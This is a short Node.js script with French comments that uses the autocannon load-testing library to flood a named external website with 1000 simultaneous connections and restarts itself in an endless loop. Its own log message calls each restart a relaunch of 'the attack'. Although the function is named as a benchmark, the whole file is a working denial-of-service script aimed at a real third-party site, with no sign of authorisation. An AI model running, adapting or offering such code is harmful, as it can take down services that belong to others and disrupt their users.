const autocannon = require('autocannon');

function runBenchmark() {
  const instance = autocannon({
    url: 'https://www.ctmotors.mg',
    connections: 1000, // nombre de connexions simultanées
    duration: 10       // durée en secondes
  });

  autocannon.track(instance);

  instance.on('done', () => {
    console.log('\n🔁 Relancement de l’attaque...');
    runBenchmark(); // relance à l’infini
  });
}

runBenchmark();
